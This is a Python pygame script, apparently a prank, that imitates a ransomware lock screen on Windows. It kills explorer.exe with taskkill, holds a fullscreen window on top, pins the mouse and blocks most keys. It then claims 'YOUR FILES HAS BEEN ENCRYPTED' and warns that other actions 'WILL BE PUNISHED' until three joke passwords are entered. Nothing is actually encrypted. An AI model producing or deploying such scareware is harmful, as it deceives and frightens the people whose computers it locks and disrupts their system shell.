import pygame
import sys
import subprocess
import atexit

def create_restricted_window():
    pygame.init()
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    
    # Hide mouse cursor
    pygame.mouse.set_visible(False)
    
    # Set up font for text display
    font = pygame.font.Font(None, 48)
    small_font = pygame.font.Font(None, 36)
    
    # Kill explorer to prevent Win+D, Win+M
    subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], capture_output=True)
    
    # Make sure explorer restarts when program exits
    atexit.register(lambda: subprocess.Popen(['explorer.exe']))
    
    if sys.platform == 'win32':
        import ctypes
        
        # Get window handle
        hwnd = pygame.display.get_wm_info()['window']
        user32 = ctypes.windll.user32
        
        # Windows API constants
        HWND_TOPMOST = -1
        SWP_NOMOVE = 0x0002
        SWP_NOSIZE = 0x0001
        SWP_SHOWWINDOW = 0x0040
        
        # Set window to always on top
        user32.SetWindowPos(
            hwnd,
            HWND_TOPMOST,
            0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
        )
    
    allowed_keys = set(range(pygame.K_a, pygame.K_z + 1))
    allowed_keys.update([pygame.K_RETURN, pygame.K_KP_ENTER])
    
    input_text = ""
    session = 0
    max_sessions = 3  # Sessions 0, 1, 2
    
    # Passwords for each session
    passwords = {
        0: "fecdcfebfceb",
        1: "macek",
        2: "nose"
    }

    hits = {
        0: "The password is fecdcfebfceb",
        1: "Who is the best teacher ever?",
        2: "The best word we all know that starts with n"
    }
    
    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                continue
            elif event.type == pygame.KEYDOWN:
                if event.key in allowed_keys:
                    if event.key in (pygame.K_RETURN, pygame.K_KP_ENTER):
                        # Check password for current session
                        if input_text.lower() == passwords[session]:
                            print(f"Session {session} password correct!")
                            if session < max_sessions - 1:
                                session += 1
                                print(f"Moving to session {session}")
                            else:
                                print("All sessions complete! Exiting...")
                                running = False
                        else:
                            print(f"Wrong password for session {session}")
                        input_text = ""
                    else:
                        char = chr(event.key).upper() if event.mod & pygame.KMOD_SHIFT else chr(event.key)
                        input_text += char
                        print(f"Key: {char}")
                elif event.key == pygame.K_q and event.mod & pygame.KMOD_CTRL and event.mod & pygame.KMOD_SHIFT:
                    running = False
            # Ignore all mouse events
            elif event.type in (pygame.MOUSEMOTION, pygame.MOUSEBUTTONDOWN, pygame.MOUSEBUTTONUP, pygame.MOUSEWHEEL):
                pass
        
        # Disable mouse by warping it to corner
        pygame.mouse.set_pos(0, 0)
        
        # Draw everything
        screen.fill((0, 0, 0))
        
        # Draw session level
        
        # Draw progress bar
        bar_width = 300
        bar_height = 20
        bar_x = screen.get_width() // 2 - bar_width // 2
        bar_y = screen.get_height() // 2 - 80
        

        
        # Progress text
        progress_text = small_font.render(f"level {session + 1}/{max_sessions}", True, (255, 255, 255))
        progress_rect = progress_text.get_rect(center=(screen.get_width() // 2, bar_y - 20))
        screen.blit(progress_text, progress_rect)
        
        # Draw title text
        title_text = font.render("YOUR FILES HAS BEEN ENCRYPTED", True, (255, 0, 0))
        title_rect = title_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2 - 40))
        screen.blit(title_text, title_rect)
        
        # Draw instruction text
        instruction_text = small_font.render(hits[session], True, (255, 255, 255))
        instruction_rect = instruction_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2))
        screen.blit(instruction_text, instruction_rect)
        
        # Draw input text (shown as asterisks)
        masked_text = "*" * len(input_text)
        input_display = small_font.render(f"Password: {masked_text}", True, (0, 255, 0))
        input_rect = input_display.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2 + 60))
        screen.blit(input_display, input_rect)

        warning_text = small_font.render(f"Warning: any action besides trying to decrypt your files WILL BE PUNISHED!", True, (200, 200, 200))
        warning_rect = warning_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 4 * 3))
        screen.blit(warning_text, warning_rect)

        # Continuously force window to stay on top
        if sys.platform == 'win32':
            user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, 
                              SWP_NOMOVE | SWP_NOSIZE)
        
        pygame.display.flip()
    
    pygame.quit()

create_restricted_window()